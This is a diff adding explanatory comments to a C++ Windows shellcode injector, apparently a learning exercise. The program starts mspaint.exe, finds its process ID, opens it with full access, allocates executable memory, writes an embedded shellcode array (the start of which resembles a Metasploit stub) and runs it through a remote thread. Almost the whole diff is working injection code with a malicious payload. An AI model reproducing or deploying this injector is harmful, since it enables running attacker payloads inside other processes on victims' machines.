@@ -57,11 +57,13 @@ unsigned char shellCode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x4
 
 using namespace std;
 
+/* function that receives a cmd command and gives the output */
 string exec(string command) {
    char buffer[128];
    string result = "";
 
    // Open pipe to file
+   // Popen executes the given command
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
       return "popen failed!";
@@ -79,6 +81,7 @@ string exec(string command) {
    return result;
 }
 
+/* doesn't work :( */
 int main(){
 
     // start a process with mspaint.exe
@@ -92,12 +95,17 @@ int main(){
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = true;
 
+    /* executes a process o mspaint.exe */
     HINSTANCE hInstance = ShellExecuteA (NULL, "open", "mspaint.exe", NULL, NULL, SW_SHOWNORMAL);
+
+    /* close the handles */
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
+    /* command to identify the PID of the mspaint.exe process */
     string output = exec("tasklist | findstr mspaint.exe");
     
+    /* string manipulation to obtain the PID (PS: i know, it is a mess)*/
     unsigned first = output.find(" ");
     unsigned last = output.find(" Console");
 
@@ -105,32 +113,34 @@ int main(){
 
     paintPID.erase(std::remove_if(paintPID.begin(), paintPID.end(), ::isspace),paintPID.end());
 
+    /* string to DWORD convertion */
     PID = strtol(paintPID.c_str(), 0, 0);
 
     printf("%s trying to open a handle to process (%ld)\n", i, PID);
 
+    /* open a handle to the mspaint.exe process */
     hProcess = OpenProcess(
         PROCESS_ALL_ACCESS,
         FALSE,
         PID
     );
 
-    /* open a handle to the process */
+    /* check if all went well */
     if(hProcess == NULL){
         printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
     }
 
     printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);;
 
-    /* allocate bytes to the process memory */
+    /* allocate bytes to the process memory (allocate a buffer with the shellcode size in the process) */
     rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     printf("%s allocated  %zu-bytes with PAGE_EXECUTE_READWRITE permitions\n", k, sizeof(shellCode));
 
-    /* actually write that allocated memory to the process memorry */
+    /* actually write that allocated memory to the process memory (write the payload in the buffer allocated in the process) */
     WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof(shellCode), NULL);
     printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellCode));
 
-    /* create thread to run our payload */
+    /* create thread (thread handle) to run the payload */
     hThread = CreateRemoteThreadEx(
         hProcess,
         NULL,
@@ -142,6 +152,7 @@ int main(){
         &TID
     );
 
+    /* check if all went well */
     if(hThread == NULL){
         printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
         CloseHandle(hProcess);
@@ -151,10 +162,14 @@ int main(){
     printf("%s got a handle to the thread (%ld)\n\\---0x%p", k, TID, hThread);
 
     printf("%s waiting for thread to finish\n", k);
+
+    /* wait an infinite amount of time */
     WaitForSingleObject(hThread, INFINITE);
     printf("%s thread finished executing\n", k);
 
     printf("%s cleaning up\n, i");
+
+    /* close the handles */
     CloseHandle(hThread);
     CloseHandle(hProcess);
     printf("%s finished! see you next time :>\n", k);
